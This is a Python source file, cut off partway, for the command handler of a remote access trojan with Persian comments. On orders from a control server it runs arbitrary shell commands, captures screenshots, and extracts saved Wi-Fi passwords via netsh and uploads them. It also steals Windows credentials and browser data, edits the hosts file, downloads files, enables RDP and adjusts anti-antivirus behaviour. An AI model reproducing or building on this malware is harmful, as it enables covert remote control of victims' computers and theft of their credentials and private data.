import subprocess
import platform
import psutil
import socket
import logging
import base64
import os
import shutil
import time
import ctypes
import winreg
import json
import tempfile
from datetime import datetime
from rat_config import Config
from monitoring.rdp_controller import RDPController
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator
from system.anti_av import AntiAV
from system.file_manager import FileManager
from system.collector import SystemCollector
from system.vm_detector import VMDetector

class CommandError(Exception):
    """Command execution related errors"""
    pass

class CommandHandler:
    
    # Class-level instances to avoid repeated initialization
    _encryption_manager = None
    _communicator = None
    _file_manager = None
    
    @classmethod
    def _get_encryption_manager(cls):
        if cls._encryption_manager is None:
            cls._encryption_manager = EncryptionManager(Config.ENCRYPTION_KEY)
        return cls._encryption_manager
    
    @classmethod
    def _get_communicator(cls):
        if cls._communicator is None:
            client_id = Config.get_client_id()
            encryption_manager = cls._get_encryption_manager()
            cls._communicator = ServerCommunicator(client_id, encryption_manager)
        return cls._communicator
    
    @classmethod
    def _get_file_manager(cls):
        if cls._file_manager is None:
            encryption_manager = cls._get_encryption_manager()
            communicator = cls._get_communicator()
            cls._file_manager = FileManager(encryption_manager, communicator)
        return cls._file_manager

    @staticmethod
    def execute(command_type, params):
        """Execute command based on type and parameters"""
        if Config.DEBUG_MODE:
            logging.info(f"Executing command type: {command_type}, params: {params}")

        # تبدیل params به dictionary اگر list هست
        if isinstance(params, list):
            if params and isinstance(params[0], dict):
                params = params[0]  # اگر اولین المان dictionary هست
            else:
                params = {}  # اگر لیست خالی یا غیر dictionary هست

        handlers = {
            # دستورات اصلی
            'system_info': CommandHandler.handle_system_info,
            'system_command': CommandHandler.handle_system_command,
            'capture_screenshot': CommandHandler.handle_screenshot,
            'file_operation': CommandHandler.handle_file_operation,
            'process_management': CommandHandler.handle_process_management,
            'edit_hosts': CommandHandler.handle_edit_hosts,
            'open_url': CommandHandler.handle_open_url,
            'upload_file': CommandHandler.handle_upload_file,
            'end_task': CommandHandler.handle_end_task,
            'enable_rdp': CommandHandler.handle_enable_rdp,
            'disable_rdp': CommandHandler.handle_disable_rdp,
            'adjust_behavior': CommandHandler.handle_adjust_behavior,
            'get_wifi_passwords': CommandHandler.handle_wifi_passwords,
            'cleanup_rdp': CommandHandler.handle_cleanup_rdp,
            'status': CommandHandler.handle_status,
            'collect_browser_data': CommandHandler.handle_collect_browser_data,
            'collect_system_data': CommandHandler.handle_collect_system_data,
            'vm_detection': CommandHandler.handle_vm_detection,
            'antivirus_status': CommandHandler.handle_antivirus_status,
            'download_file': CommandHandler.handle_download_file,
            'execute_powershell': CommandHandler.handle_execute_powershell,

            # دستورات جدید از سرور
            'get-info': CommandHandler.handle_get_info,
            'screenshot': CommandHandler.handle_screenshot_command,
            'exec': CommandHandler.handle_exec_command,
            'browse': CommandHandler.handle_browse_command,
            'go': CommandHandler.handle_go_command,
            'shutdown': CommandHandler.handle_shutdown_command,
            'restart': CommandHandler.handle_restart_command,
            'sleep': CommandHandler.handle_sleep_command,
            'signout': CommandHandler.handle_signout_command,
            'tasks': CommandHandler.handle_tasks_command,
            'getwifipasswords': CommandHandler.handle_wifi_passwords,
            'file_operation': CommandHandler.handle_file_operation,  # اضافه کردن مجدد برای اطمینان
            'collect_browser_data_comprehensive': CommandHandler.handle_collect_browser_data_comprehensive,
            'get_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,  # نام جایگزین
            'get_comprehensive_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,
            'get_windows_credentials': CommandHandler.handle_windows_credentials,
        }

        handler = handlers.get(command_type)
        if not handler:
            if Config.DEBUG_MODE:
                logging.error(f"Unknown command type: {command_type}")

            # گزارش خطای دستور ناشناخته به سرور
            error_result = {
                "status": "error",
                "message": f"Unknown command type: {command_type}",
                "command_type": command_type,
                "timestamp": datetime.now().isoformat()
            }
            return error_result

        try:
            return handler(params)

        except Exception as e:
            logging.error(f"Command execution failed for {command_type}: {str(e)}")

            # گزارش خطای جزئیات به سرور
            error_result = {
                "status": "error",
                "message": f"Command execution failed: {str(e)}",
                "command_type": command_type,
                "timestamp": datetime.now().isoformat(),
                "error_details": str(e)
            }
            return error_result

    # ==================== HANDLERS FOR NEW COMMANDS ====================

    @staticmethod
    def handle_windows_credentials(params):
        """Handle Windows credential extraction command"""
        try:
            logging.info("Handling Windows credentials extraction command")

            from system.collector import SystemCollector
            collector = SystemCollector()

            credentials = collector.collect_windows_credentials()

            return {
                "status": "success",
                "message": "Windows credentials extracted successfully",
                "credentials": credentials,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logging.error(f"Windows credentials extraction failed: {str(e)}")
            return {
                "status": "error",
                "message": f"Windows credentials extraction failed: {str(e)}",
                "timestamp": datetime.now().isoformat()
            }

    @staticmethod
    def handle_get_info(params):
        """Handle /get-info command - comprehensive system information"""
        try:
            logging.info("Handling get-info command")
            
            # Collect comprehensive system information
            system_info = {
                'os': platform.system(),
                'os_version': platform.release(),
                'hostname': socket.gethostname(),
                'username': os.getlogin(),
                'cpu_usage': psutil.cpu_percent(interval=1),
                'memory': psutil.virtual_memory()._asdict(),
                'disk': psutil.disk_usage('/')._asdict(),
                'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                'timestamp': datetime.now().isoformat(),
                'client_id': Config.get_client_id(),
                'client_version': Config.CLIENT_VERSION
            }
            
            # Add detailed CPU information
            try:
                system_info['cpu_cores'] = psutil.cpu_count()
                system_info['cpu_freq'] = psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {}
            except Exception as e:
                system_info['cpu_info_error'] = str(e)
            
            # Add network information
            try:
                system_info['ip_address'] = socket.gethostbyname(socket.gethostname())
                system_info['network_interfaces'] = []
                
                for interface, addrs in psutil.net_if_addrs().items():
                    interface_info = {
                        'interface': interface,
                        'addresses': []
                    }
                    for addr in addrs:
                        interface_info['addresses'].append({
                            'family': str(addr.family),
                            'address': addr.address,
                            'netmask': addr.netmask
                        })
                    system_info['network_interfaces'].append(interface_info)
            except Exception as e:
                system_info['network_info_error'] = str(e)
            
            # Add running processes count
            try:
                system_info['running_processes'] = len(list(psutil.process_iter()))
            except Exception as e:
                system_info['process_count_error'] = str(e)
            
            # Add feature status
            system_info['features'] = Config.get_behavior_config()
            
            logging.info("Get-info command executed successfully")
            return system_info
            
        except Exception as e:
            logging.error(f"Get-info command failed: {str(e)}")
            raise CommandError(f"Get-info command failed: {str(e)}")

    @staticmethod
    def handle_screenshot_command(params):
        """Handle /screenshot command"""
        try:
            logging.info("Handling screenshot command")
            return CommandHandler.handle_screenshot(params)
        except Exception as e:
            logging.error(f"Screenshot command failed: {str(e)}")
            raise CommandError(f"Screenshot command failed: {str(e)}")

    @staticmethod
    def handle_exec_command(params):
        """Handle /exec command - execute system command"""
        try:
            logging.info("Handling exec command")
            # Use the existing system_command handler
            return CommandHandler.handle_system_command(params)
        except Exception as e:
            logging.error(f"Exec command failed: {str(e)}")
            raise CommandError(f"Exec command failed: {str(e)}")

    @staticmethod
    def handle_browse_command(params):
        """Handle /browse command - file browsing"""
        try:
            logging.info("Handling browse command")
            
            # تبدیل params به dictionary اگر لازم باشد
            if isinstance(params, list):
                if params and isinstance(params[0], dict):
                    params = params[0]
                else:
                    params = {}
            
            # پیش‌فرض مسیر جاری اگر مسیری ارائه نشده
            if not params.get('path'):
                params['path'] = os.getcwd()
            
            params['action'] = 'list'
            return CommandHandler.handle_file_operation(params)
            
        except Exception as e:
            logging.error(f"Browse command failed: {str(e)}")
            return {
                "status": "error",
                "message": f"Browse command failed: {str(e)}",
                "timestamp": datetime.now().isoformat()
            }
    
    @staticmethod
    def handle_go_command(params):
        """Handle /go command - open URL"""
        try:
            logging.info("Handling go command")
            return CommandHandler.handle_open_url(params)
        except Exception as e:
            logging.error(f"Go command failed: {str(e)}")
            raise CommandError(f"Go command failed: {str(e)}")

    @staticmethod
    def handle_shutdown_command(params):
        """Handle /shutdown command"""
        try:
            logging.info("Handling shutdown command")
            params['command'] = 'shutdown'
            return CommandHandler.handle_system_command(params)
        except Exception as e:
            logging.error(f"Shutdown command failed: {str(e)}")
            raise CommandError(f"Shutdown command failed: {str(e)}")

    @staticmethod
    def handle_restart_command(params):
        """Handle /restart command"""
        try:
            logging.info("Handling restart command")
            params['command'] = 'restart'
            return CommandHandler.handle_system_command(params)
        except Exception as e:
            logging.error(f"Restart command failed: {str(e)}")
            raise CommandError(f"Restart command failed: {str(e)}")

    @staticmethod
    def handle_sleep_command(params):
        """Handle /sleep command specifically"""
        try:
            logging.info("Handling sleep command")

            # بررسی دسترسی Administrator
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                if not is_admin:
                    logging.error("Sleep command requires admin privileges")
                    raise CommandError("Sleep command requires admin privileges")
            except Exception as e:
                logging.error(f"Failed to check admin privileges: {str(e)}")
                raise CommandError(f"Failed to check admin privileges for sleep command")

            # اجرای دستور sleep
            sleep_command = 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0'

            if Config.DEBUG_MODE:
                logging.info(f"Executing sleep command: {sleep_command}")

            result = subprocess.run(
                sleep_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            output = {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'command': sleep_command,
                'original_command': '/sleep',
                'timestamp': datetime.now().isoformat(),
                'success': result.returncode == 0
            }

            if Config.DEBUG_MODE:
                logging.info(f"Sleep command executed, returncode: {result.returncode}")

            return output

        except subprocess.TimeoutExpired:
            error_msg = "Sleep command timed out"
            logging.error(error_msg)
            raise CommandError(error_msg)

        except Exception as e:
            error_msg = f"Failed to execute sleep command: {str(e)}"
            logging.error(error_msg)
            raise CommandError(error_msg)


    @staticmethod
    def handle_signout_command(params):
        """Handle /signout command"""
        try:
            logging.info("Handling signout command")
            params['command'] = 'signout'
            return CommandHandler.handle_system_command(params)
        except Exception as e:
            logging.error(f"Signout command failed: {str(e)}")
            raise CommandError(f"Signout command failed: {str(e)}")

    @staticmethod
    def handle_tasks_command(params):
        """Handle /tasks command - list processes"""
        try:
            logging.info("Handling tasks command")
            params['action'] = 'list'
            return CommandHandler.handle_process_management(params)
        except Exception as e:
            logging.error(f"Tasks command failed: {str(e)}")
            raise CommandError(f"Tasks command failed: {str(e)}")

    # ==================== EXISTING HANDLERS ====================

    @staticmethod
    def handle_status(params):
        """Handle status command - comprehensive system status"""
        try:
            # This is similar to get-info but with different structure
            system_info = CommandHandler.handle_get_info(params)
            system_info['online'] = True
            system_info['last_seen'] = datetime.now().isoformat()
            return system_info
        except Exception as e:
            logging.error(f"Status command failed: {str(e)}")
            raise CommandError(f"Status command failed: {str(e)}")

    @staticmethod
    def handle_screenshot(params):
        """Capture screenshot"""
        try:
            import pyautogui
            from PIL import Image
            
            # Capture screenshot
            screenshot = pyautogui.screenshot()
            
            # Use temporary file
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
                screenshot_path = temp_file.name
            
            # Save with quality settings
            screenshot.save(screenshot_path, 
                          format='PNG', 
                          optimize=True, 
                          quality=Config.SCREENSHOT_QUALITY)
            
            # Read and encode
            with open(screenshot_path, 'rb') as f:
                screenshot_data = f.read()
            
            # Cleanup
            os.unlink(screenshot_path)
            
            if Config.DEBUG_MODE:
                logging.info("Screenshot captured successfully")
            
            return {
                'screenshot': base64.b64encode(screenshot_data).decode(),
                'size': len(screenshot_data),
                'timestamp': datetime.now().isoformat(),
                'resolution': f"{screenshot.width}x{screenshot.height}"
            }
            
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to capture screenshot: {str(e)}")
            raise CommandError(f"Failed to capture screenshot: {str(e)}")

    @staticmethod
    def handle_system_command(params):
        """Execute system command with proper error handling"""
        try:
            # تبدیل params به دیکشنری اگر لیست است یا None است
            if params is None:
                params = {}
            elif isinstance(params, list):
                if params and isinstance(params[0], dict):
                    params = params[0]
                else:
                    params = {}
            
            if not isinstance(params, dict):
                params = {}
            
            # استخراج command از پارامترهای مختلف
            command = (params.get('command') or 
                       params.get('original_command') or 
                       params.get('cmd') or 
                       params.get('type'))
            
            if not command:
                error_msg = "No command provided"
                logging.error(error_msg)
                return {
                    "status": "error",
                    "message": error_msg,
                    "command": "unknown",
                    "timestamp": datetime.now().isoformat()
                }
            
            # حذف اسلش از ابتدای دستور اگر وجود دارد
            if command.startswith('/'):
                command = command[1:]
            
            COMMAND_MAPPING = {
                'shutdown': 'shutdown /s /t 0',
                'restart': 'shutdown /r /t 0',
                'sleep': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
                'signout': 'logoff',
                'lock': 'rundll32.exe user32.dll,LockWorkStation',
                'hibernate': 'shutdown /h',
                'standby': 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
                'reboot': 'shutdown /r /t 0',
                'poweroff': 'shutdown /s /t 0',
            }
        
            sensitive_commands = ['shutdown', 'restart', 'sleep', 'signout', 'hibernate', 'standby', 'reboot', 'poweroff']
            
            # بررسی دسترسی Administrator برای دستورات حساس
            if command.lower() in sensitive_commands:
                try:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
                    if not is_admin:
                        error_msg = f"Command '{command}' requires admin privileges"
                        logging.error(error_msg)
                        return {
                            "status": "error",
                            "message": error_msg,
                            "command": command,
                            "requires_admin": True,
                            "timestamp": datetime.now().isoformat()
                        }
                except Exception as e:
                    error_msg = f"Failed to check admin privileges: {str(e)}"
                    logging.error(error_msg)
                    return {
                        "status": "error", 
                        "message": error_msg,
                        "command": command,
                        "timestamp": datetime.now().isoformat()
                    }
            
            # نگاشت دستور به دستور واقعی
            actual_command = COMMAND_MAPPING.get(command.lower(), command)
            if Config.DEBUG_MODE:
                logging.info(f"Mapped command: {command} -> {actual_command}")
            
            try:
                if Config.DEBUG_MODE:
                    logging.info(f"Executing system command: {actual_command}")
                
                # استفاده از shell=True برای دستورات خاص که نیاز به محیط shell دارند
                shell_needed = any(cmd in actual_command.lower() for cmd in ['shutdown', 'logoff', 'rundll32', 'powercfg'])
                
                if shell_needed:
                    result = subprocess.run(
                        actual_command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=300,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                else:
                    shell_cmd = ['cmd.exe', '/c', actual_command]
                    result = subprocess.run(
                        shell_cmd,
                        capture_output=True,
                        text=True,
                        timeout=300,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                
                output = {
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode,
                    'command': actual_command,
                    'original_command': command,
                    'timestamp': datetime.now().isoformat(),
                    'success': result.returncode == 0,
                    'status': 'success' if result.returncode == 0 else 'error'
                }
                
                if Config.DEBUG_MODE:
                    logging.info(f"System command executed: {actual_command}, returncode: {result.returncode}")
                
                return output
                
            except subprocess.TimeoutExpired:
                error_msg = f"Command timed out: {actual_command}"
                logging.error(error_msg)
                return {
                    "status": "error",
                    "message": error_msg,
                    "command": actual_command,
                    "timestamp": datetime.now().isoformat()
                }
            
            except FileNotFoundError:
                error_msg = f"Command not found: {actual_command}"
                logging.error(error_msg)
                return {
                    "status": "error",
                    "message": error_msg, 
                    "command": actual_command,
                    "timestamp": datetime.now().isoformat()
                }
            
            except PermissionError:
                error_msg = f"Permission denied for command: {actual_command}"
                logging.error(error_msg)
                return {
                    "status": "error",
                    "message": error_msg,
                    "command": actual_command,
                    "timestamp": datetime.now().isoformat()
                }
            
            except Exception as e:
                error_msg = f"Failed to execute command '{actual_command}': {str(e)}"
                logging.error(error_msg)
                return {
                    "status": "error",
                    "message": error_msg,
                    "command": actual_command,
                    "timestamp": datetime.now().isoformat()
                }
        
        except Exception as e:
            error_msg = f"Unexpected error in system command handler: {str(e)}"
            logging.error(error_msg)
            return {
                "status": "error",
                "message": error_msg,
                "timestamp": datetime.now().isoformat()
            }
    
    @staticmethod
    def handle_wifi_passwords(params: dict) -> dict:
        """Extract WiFi passwords"""
        try:
            if platform.system().lower() != "windows":
                logging.info("Wi-Fi password extraction only supported on Windows")
                return {
                    "status": "error",
                    "message": "Wi-Fi password extraction only supported on Windows",
                    "wifi_profiles": []
                }
            
            # Get WiFi profiles
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode != 0:
                logging.error(f"Failed to get Wi-Fi profiles: {result.stderr}")
                raise CommandError(f"Failed to get Wi-Fi profiles: {result.stderr}")
            
            profiles = []
            for line in result.stdout.splitlines():
                if "All User Profile" in line:
                    ssid = line.split(":")[1].strip()
                    profiles.append(ssid)
            
            wifi_data = []
            for ssid in profiles:
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    capture_output=True,
                    text=True,
                    timeout=30,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if result.returncode != 0:
                    logging.warning(f"Failed to get details for SSID {ssid}: {result.stderr}")
                    continue
                
                password = None
                for line in result.stdout.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                
                wifi_data.append({
                    "ssid": ssid,
                    "password": password if password else "No password found",
                    "timestamp": datetime.now().isoformat()
                })
            
            if not wifi_data:
                logging.info("No Wi-Fi profiles found")
                return {
                    "status": "success",
                    "message": "No Wi-Fi profiles found",
                    "wifi_profiles": []
                }
            
            if Config.DEBUG_MODE:
                logging.info(f"Extracted {len(wifi_data)} Wi-Fi profiles")
            
            # Upload to server if enabled
            if Config.ENABLE_WIFI_PASSWORD_EXTRACTION:
                try:
                    communicator = CommandHandler._get_communicator()
                    communicator.upload_wifi_passwords({
                        "wifi_profiles": wifi_data,
                        "client_id": Config.get_client_id(),
                        "timestamp": datetime.now().isoformat()
                    })
                except Exception as e:
                    logging.warning(f"Failed to upload WiFi passwords: {str(e)}")
            
            return {
                "status": "success",
                "message": "Wi-Fi profiles extracted successfully",
                "wifi_profiles": wifi_data
            }
            
        except Exception as e:
            logging.error(f"Wi-Fi password extraction error: {str(e)}")
            raise CommandError(f"Wi-Fi password extraction error: {str(e)}")

    @staticmethod
    def handle_file_operation(params):
        """Perform file operations"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            return {"error": "File management disabled"}

        # تبدیل params به dictionary اگر لازم باشد
        if isinstance(params, list):
            if params and isinstance(params[0], dict):
                params = params[0]
            else:
                params = {}

        # اگر params هنوز dictionary نیست، یک dictionary خالی ایجاد کن
        if not isinstance(params, dict):
            params = {}

        action = params.get('action', 'list')  # پیش‌فرض 'list' اگر action مشخص نشده
        path = params.get('path', os.getcwd())  # پیش‌فرض مسیر جاری

        if not action:
            if Config.DEBUG_MODE:
                logging.error("Missing action in file operation")
            return {"error": "Missing action"}

        # Security: Restrict access to sensitive paths
        restricted_paths = [
            'C:\\Windows\\System32',
            'C:\\Windows\\SysWOW64', 
            'C:\\Program Files',
            'C:\\Program Files (x86)',
            'C:\\Boot',
            'C:\\Recovery'
        ]

        for restricted in restricted_paths:
            if path.lower().startswith(restricted.lower()):
                if Config.DEBUG_MODE:
                    logging.error(f"Access to restricted path denied: {path}")
                return {"error": f"Access to restricted path denied: {path}"}

        try:
            file_manager = CommandHandler._get_file_manager()

            if action == 'list':
                return file_manager.list_files(path)

            elif action == 'read':
                content = params.get('content', '')
                return file_manager.edit_file(path, content)

            elif action == 'delete':
                return file_manager.delete_file(path)

            elif action == 'download':
                return file_manager.download_file(path)

            elif action == 'info':
                return file_manager.get_file_info(path)

            elif action == 'search':
                pattern = params.get('pattern', '')
                return file_manager.search_files(path, pattern)

            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported file operation: {action}")
                return {"error": f"Unsupported file operation: {action}"}

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"File operation failed: {str(e)}")
            return {"error": f"File operation failed: {str(e)}"}

    @staticmethod
    def handle_system_info(params):
        """Collect system information"""
        try:
            system_info = {
                'os': platform.system(),
                'os_version': platform.release(),
                'hostname': socket.gethostname(),
                'cpu_usage': psutil.cpu_percent(interval=1),
                'memory': psutil.virtual_memory()._asdict(),
                'disk': psutil.disk_usage('/')._asdict(),
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                'timestamp': datetime.now().isoformat()
            }
            
            # Add additional system details
            try:
                system_info['cpu_cores'] = psutil.cpu_count()
                system_info['cpu_freq'] = psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {}
                system_info['network'] = psutil.net_io_counters()._asdict()
            except Exception as e:
                system_info['additional_info_error'] = str(e)
            
            if Config.DEBUG_MODE:
                logging.info("System info collected successfully")
            
            return system_info
            
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to collect system info: {str(e)}")
            raise CommandError(f"Failed to collect system info: {str(e)}")

    @staticmethod
    def handle_process_management(params):
        """Manage processes"""
        action = params.get('action')
        if not action:
            if Config.DEBUG_MODE:
                logging.error("Missing action")
            raise CommandError("Missing action")
        
        try:
            if action == 'list':
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                    try:
                        processes.append({
                            'pid': proc.info['pid'],
                            'name': proc.info['name'],
                            'username': proc.info['username'],
                            'memory_percent': round(proc.info['memory_percent'], 2),
                            'cpu_percent': round(proc.info['cpu_percent'], 2)
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                # Sort by memory usage
                processes.sort(key=lambda x: x['memory_percent'], reverse=True)
                
                return {
                    'processes': processes[:100],  # Limit to top 100
                    'total_count': len(processes),
                    'timestamp': datetime.now().isoformat()
                }
            
            elif action == 'kill':
                pid = params.get('pid')
                if not pid:
                    raise CommandError("No PID provided")
                
                try:
                    process = psutil.Process(pid)
                    process.terminate()
                    return {
                        'status': 'success',
                        'message': f'Process {pid} terminated',
                        'pid': pid
                    }
                except Exception as e:
                    raise CommandError(f"Failed to kill process {pid}: {str(e)}")
            
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported process management action: {action}")
                raise CommandError(f"Unsupported process management action: {action}")
                
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Process management failed: {str(e)}")
            raise CommandError(f"Process management failed: {str(e)}")

    @staticmethod
    def handle_edit_hosts(params):
        """Edit hosts file"""
        action = params.get('action')
        if not action:
            if Config.DEBUG_MODE:
                logging.error("Missing action")
            raise CommandError("Missing action")
        
        try:
            hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts' if platform.system() == 'Windows' else '/etc/hosts'
            
            if action == 'list':
                with open(hosts_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {
                    'content': content,
                    'path': hosts_path,
                    'timestamp': datetime.now().isoformat()
                }
            
            elif action == 'add':
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    raise CommandError("Admin privileges required to edit hosts file")
                
                entry = params.get('entry')
                if not entry:
                    raise CommandError("No entry provided")
                
                with open(hosts_path, 'a', encoding='utf-8') as f:
                    f.write(f'\n{entry}')
                
                return {
                    'status': 'success',
                    'message': f'Entry added to hosts file: {entry}'
                }
            
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported hosts action: {action}")
                raise CommandError(f"Unsupported hosts action: {action}")
                
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Edit hosts failed: {str(e)}")
            raise CommandError(f"Edit hosts failed: {str(e)}")

    @staticmethod
    def handle_open_url(params):
        """Open URL in default browser"""
        url = params.get('url')
        if not url:
            if Config.DEBUG_MODE:
                logging.error("No URL provided")
            raise CommandError("No URL provided")
        
        try:
            import webbrowser
            
            # Validate URL format
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            # Log the URL being opened
            logging.info(f"Opening URL: {url}")
            
            # Open URL in default browser
            result = webbrowser.open(url)
            
            if result:
                if Config.DEBUG_MODE:
                    logging.info(f"Successfully opened URL: {url}")
                return {
                    'status': 'success',
                    'message': f'URL opened: {url}',
                    'url': url,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Failed to open URL: {url}")
                return {
                    'status': 'error',
                    'message': f'Failed to open URL: {url}',
                    'url': url
                }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to open URL: {str(e)}")
            raise CommandError(f"Failed to open URL: {str(e)}")

    @staticmethod
    def handle_upload_file(params):
        """Upload file from URL"""
        source = params.get('source')
        file_url = params.get('file_url')
        dest_path = params.get('dest_path')
        
        if not source or not file_url or not dest_path:
            if Config.DEBUG_MODE:
                logging.error("Missing source, file_url, or dest_path")
            raise CommandError("Missing source, file_url, or dest_path")
        
        try:
            if source == 'url':
                communicator = CommandHandler._get_communicator()
                response = communicator._send_request(
                    "action=download_file",
                    data={
                        "client_id": Config.get_client_id(),
                        "token": Config.SECRET_TOKEN,
                        "file_url": file_url
                    }
                )
                
                if not response or response[0].get('status') != 'success':
                    error_msg = response[0].get('message', 'Unknown error') if response else 'No response'
                    raise CommandError(f"Failed to download file from {file_url}: {error_msg}")
                
                file_content = response[0].get('content')
                if not file_content:
                    raise CommandError("No file content received")
                
                # Ensure directory exists
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                
                with open(dest_path, 'wb') as f:
                    f.write(file_content)
                
                if Config.DEBUG_MODE:
                    logging.info(f"File downloaded from {file_url} to {dest_path}")
                
                return {
                    'status': 'success', 
                    'path': dest_path,
                    'size': len(file_content),
                    'timestamp': datetime.now().isoformat()
                }
            
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Unsupported upload source: {source}")
                raise CommandError(f"Unsupported upload source: {source}")
                
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"File upload failed: {str(e)}")
            raise CommandError(f"File upload failed: {str(e)}")

    @staticmethod
    def handle_end_task(params):
        """End a specific task/process"""
        process_name = params.get('process_name')
        if not process_name:
            if Config.DEBUG_MODE:
                logging.error("No process name provided")
            raise CommandError("No process name provided")
        
        try:
            result = subprocess.run(
                ['taskkill', '/IM', process_name, '/F'],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if Config.DEBUG_MODE:
                logging.info(f"Task {process_name} terminated: {result.stdout}")
            
            return {
                'status': 'success' if result.returncode == 0 else 'failed',
                'message': f"Task {process_name} terminated" if result.returncode == 0 else f"Failed to terminate task {process_name}",
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'process_name': process_name,
                'timestamp': datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            if Config.DEBUG_MODE:
                logging.error(f"Taskkill timed out for {process_name}")
            raise CommandError(f"Taskkill timed out for {process_name}")
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error terminating task {process_name}: {str(e)}")
            raise CommandError(f"Error terminating task {process_name}: {str(e)}")

    @staticmethod
    def handle_adjust_behavior(params):
        """Adjust client behavior based on parameters"""
        try:
            behavior = params.get("behavior", {})
            if not behavior:
                if Config.DEBUG_MODE:
                    logging.error("No behavior settings provided")
                raise CommandError("No behavior settings provided")
            
            anti_av = AntiAV()
            current_behavior = anti_av.adjust_behavior({"name": "manual"})
            current_behavior.update(behavior)
            
            if Config.DEBUG_MODE:
                logging.info(f"Behavior adjusted by server: {current_behavior}")
            
            return {
                "status": "success",
                "message": "Behavior adjusted",
                "new_behavior": current_behavior,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Adjust behavior error: {str(e)}")
            raise CommandError(f"Adjust behavior error: {str(e)}")

    @staticmethod
    def handle_enable_rdp(params):
        """Enable RDP"""
        try:
            rdp_controller = RDPController(CommandHandler._get_encryption_manager())
            result = rdp_controller.enable_rdp(params)
            if result["status"] == "success":
                logging.info("RDP enabled and configured successfully")
                return result
            else:
                logging.error(f"Failed to enable RDP: {result['message']}")
                raise CommandError(f"Failed to enable RDP: {result['message']}")
        except Exception as e:
            logging.error(f"Enable RDP error: {str(e)}")
            raise CommandError(f"Enable RDP error: {str(e)}")

    @staticmethod
    def handle_disable_rdp(params):
        """Disable RDP"""
        try:
            rdp_controller = RDPController(CommandHandler._get_encryption_manager())
            result = rdp_controller.disable_rdp()
            if result["status"] == "success":
                logging.info("RDP disabled successfully")
                return result
            else:
                logging.error(f"Failed to disable RDP: {result['message']}")
                raise CommandError(f"Failed to disable RDP: {result['message']}")
        except Exception as e:
            logging.error(f"Disable RDP error: {str(e)}")
            raise CommandError(f"Disable RDP error: {str(e)}")

    @staticmethod
    def handle_cleanup_rdp(params):
        """Clean up RDP configuration"""
        try:
            rdp_controller = RDPController(CommandHandler._get_encryption_manager())
            result = rdp_controller.cleanup_rdp()
            if result["status"] == "success":
                logging.info("RDP cleanup completed successfully")
                return result
            else:
                logging.error(f"Failed to clean up RDP: {result['message']}")
                raise CommandError(f"Failed to clean up RDP: {result['message']}")
        except Exception as e:
            logging.error(f"Cleanup RDP error: {str(e)}")
            raise CommandError(f"Cleanup RDP error: {str(e)}")

    @staticmethod
    def handle_collect_browser_data(params):
        """Collect browser data"""
        try:
            if not Config.ENABLE_BROWSER_DATA_COLLECTION:
                return {
                    "status": "skipped",
                    "message": "Browser data collection disabled"
                }
            
            collector = SystemCollector()
            browser_data = collector.collect_browser_data()
            
            return {
                "status": "success",
                "message": "Browser data collected successfully",
                "data": browser_data,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"Browser data collection error: {str(e)}")
            raise CommandError(f"Browser data collection error: {str(e)}")

    @staticmethod
    def handle_collect_system_data(params):
        """Collect comprehensive system data"""
        try:
            if not Config.ENABLE_SYSTEM_INFO:
                return {
